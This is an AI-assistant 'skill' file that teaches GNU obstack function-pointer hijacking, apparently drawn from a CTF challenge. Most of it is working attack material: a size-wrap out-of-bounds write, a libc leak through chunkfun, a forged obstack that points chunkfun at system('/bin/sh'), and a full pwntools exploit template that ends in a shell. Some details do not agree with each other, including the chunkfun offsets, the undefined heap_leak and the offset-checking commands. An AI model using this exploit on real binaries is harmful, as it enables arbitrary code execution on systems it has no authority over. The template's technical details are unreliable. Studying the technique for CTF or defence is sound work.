---
name: gnu-obstack-exploit
description: How to exploit GNU obstack function-pointer hijacking vulnerabilities. Use this skill whenever the user mentions obstack, GNU obstack, chunkfun, freefun, heap exploitation, libc leaks, function pointer hijacking, or binary exploitation involving allocator state corruption. This skill covers size_t desync primitives, OOB pointer writes, libc base leaking, and fake obstack construction for arbitrary code execution.
---

# GNU Obstack Function-Pointer Hijacking Exploitation

This skill guides you through exploiting GNU obstack vulnerabilities to achieve arbitrary code execution via function-pointer hijacking.

## When to Use This Skill

Use this skill when:
- You're analyzing a binary that uses GNU obstacks (`obstack_alloc`, `obstack_free`, etc.)
- You've identified a heap corruption vulnerability affecting obstack structures
- You need to leak libc addresses through allocator function pointers
- You want to hijack `chunkfun` or `freefun` for code execution
- You're working on CTF challenges involving heap exploitation and obstacks

## Core Concepts

### Obstack Structure Layout (glibc 2.42)

```c
struct obstack {
  char *chunk;           // +0x00  Current chunk base
  char *next_free;       // +0x08  Next allocation offset
  char *chunk_limit;     // +0x10  End of current chunk
  long chunk_size;       // +0x18  Current chunk size
  void (*chunkfun)(void *, size_t);  // +0x20  Allocation function
  void (*freefun)(void *, void *);   // +0x28  Free function
  void *extra_arg;       // +0x30  Extra argument for chunkfun
  int use_extra_arg;     // +0x38  Flag: use extra_arg in calls
  // ... additional fields
};
```

**Key offsets for exploitation:**
- `chunkfun`: `+0x20` (or `+0x38` in some versions)
- `freefun`: `+0x28` (or `+0x40` in some versions)
- `extra_arg`: `+0x30`
- `use_extra_arg`: `+0x38`

### The Vulnerability Pattern

GNU obstacks trigger indirect calls through `chunkfun` when:
1. `next_free == chunk_limit` (chunk is full)
2. `_obstack_newchunk` is called to allocate a new chunk
3. The call goes through `chunkfun(extra_arg, new_size)` or `chunkfun(new_size)`

If you can corrupt an obstack structure, you control the function pointer.

## Attack Recipe

### Step 1: Identify the Size_t Desync Primitive

Look for this pattern in the binary:

```c
// Vulnerable: 32-bit register used for multiplication
void *elements = obstack_alloc(obs, sizeof(void *) * size);
```

When compiled, `sizeof(void *) * size` may use a 32-bit register:
- `size = 0x20000000` → `0x20000000 * 8 = 0x100000000` → wraps to `0x0` in 32-bit
- Result: **0-byte allocation** but logical `size` remains `0x20000000`
- Subsequent writes: `elements[curr++] = ptr;` → **8-byte OOB pointer stores**

**Detection checklist:**
- [ ] Binary uses `obstack_alloc` with computed sizes
- [ ] Size parameter comes from user input or is controllable
- [ ] Multiplication involves `sizeof(void *)` or similar
- [ ] 32-bit register used for the multiplication (check with `objdump -d`)

### Step 2: Groom Heap Adjacency

You need two heap objects adjacent in memory:

```
[Object A: pointer array with OOB write primitive]
[Object B: contains obstack pointer or obstack structure]
```

**Grooming strategy:**
1. Allocate Object A (the pointer array with size wrap)
2. Allocate Object B (victim object with obstack pointer)
3. Ensure they're adjacent (may require freeing intermediate chunks)
4. Use OOB write from A to corrupt B

### Step 3: Leak libc via chunkfun

The `chunkfun` field contains a pointer to `malloc` by default.

**Leak procedure:**
1. Use OOB write to redirect a victim pointer to the obstack structure
2. Read from offset `0x20` (or `0x38`) to get `malloc` address
3. Calculate: `libc_base = malloc_addr - malloc_offset`
4. Derive other symbols: `system = libc_base + system_offset`, `binsh = libc_base + binsh_offset`

**Example leak code:**
```python
# After OOB write redirects victim pointer to obstack
libc_leak = read_from_offset(victim_ptr, 0x20)  # chunkfun = malloc
libc_base = libc_leak - libc.symbols['malloc']
print(f"libc_base: {hex(libc_base)}")
```

### Step 4: Forge a Fake Obstack

Create attacker-controlled data that mimics an obstack header:

```python
from pwn import p64

def create_fake_obstack(system_addr, binsh_addr, heap_leak):
    fake = b""
    fake += p64(0x1000)          # chunk_size: large enough
    fake += p64(heap_leak)       # chunk: valid heap address
    fake += p64(heap_leak)       # object_base
    fake += p64(heap_leak)       # next_free: must equal chunk_limit
    fake += p64(heap_leak)       # chunk_limit: same as next_free
    fake += p64(0xF)             # alignment_mask
    fake += p64(0)               # temp
    fake += p64(system_addr)     # chunkfun: system()
    fake += p64(0)               # freefun: unused
    fake += p64(binsh_addr)      # extra_arg: "/bin/sh"
    fake += p64(1)               # use_extra_arg: enable 2-arg call
    return fake
```

**Critical fields:**
- `next_free == chunk_limit`: Forces `_obstack_newchunk` on next allocation
- `chunkfun`: Your target function (e.g., `system`)
- `extra_arg`: First argument (e.g., `"/bin/sh"` address)
- `use_extra_arg = 1`: Selects `chunkfun(extra_arg, new_size)` call form

### Step 5: Trigger the Hijack

1. Overwrite the victim's `struct obstack *` pointer to point at your fake obstack
2. Trigger any allocation on the victim obstack
3. `_obstack_newchunk` calls `chunkfun(extra_arg, new_size)` → `system("/bin/sh")`

**Trigger methods:**
- Call `obstack_alloc(victim_obs, any_size)`
- Call `obstack_push(victim_obs, any_data)`
- Any operation that requires new chunk allocation

## Complete Exploit Template

```python
from pwn import *

# Configuration
binary = './vulnerable_binary'
libc = ELF('./libc.so.6')

# Connect
p = process(binary)  # or remote('target', port)

# Step 1: Trigger size wrap
# Send size = 0x20000000 to create 0-byte allocation with huge logical size
p.sendlineafter(b'size', b'536870912')  # 0x20000000

# Step 2: Groom heap
# Allocate victim object with obstack pointer
p.sendlineafter(b'cmd', b'alloc_victim')

# Step 3: Leak libc
# Use OOB write to redirect pointer, then read chunkfun
p.sendlineafter(b'cmd', b'leak')
libc_leak = u64(p.recvline()[:6].ljust(8, b'\x00'))
libc_base = libc_leak - libc.symbols['malloc']
print(f"[*] libc_base: {hex(libc_base)}")

# Step 4: Create fake obstack
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
fake_obstack = create_fake_obstack(system_addr, binsh_addr, heap_leak)

# Step 5: Overwrite obstack pointer and trigger
p.sendlineafter(b'cmd', b'overwrite')
p.send(fake_obstack)
p.sendlineafter(b'cmd', b'alloc')  # Triggers the hijack

# Get shell
p.interactive()
```

## Debugging Tips

### Verify Obstack Offsets

```bash
# Check actual offsets in your libc
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep obstack

# Or use gdb
(gdb) p sizeof(struct obstack)
(gdb) p &((struct obstack*)0)->chunkfun
```

### Check for Size Wrap

```bash
# Disassemble the vulnerable function
objdump -d binary | grep -A 20 "vulnerable_function"

# Look for SHL EAX (32-bit shift) instead of SHL RAX (64-bit)
```

### Verify Heap Adjacency

```python
# In gdb with pwndbg
heap
vmmap
```

## Common Pitfalls

1. **Wrong offsets**: Obstruct layout varies by glibc version. Always verify offsets.
2. **ASLR**: Remember to leak libc before calculating addresses.
3. **Canaries**: If stack canaries are enabled, you may need to leak them first.
4. **PIE**: If PIE is enabled, you need to leak the binary base too.
5. **Alignment**: Obstacks may have alignment requirements. Check `alignment_mask`.

## References

- [Flagvent 2025 FV25.08 obstack exploit](https://0xdf.gitlab.io/flagvent2025/hard)
- [GNU Obstack Documentation](https://www.gnu.org/software/libc/manual/html_node/Obstacks.html)
- [pwnlib heap exploitation](https://docs.pwntools.com/en/stable/heap.html)
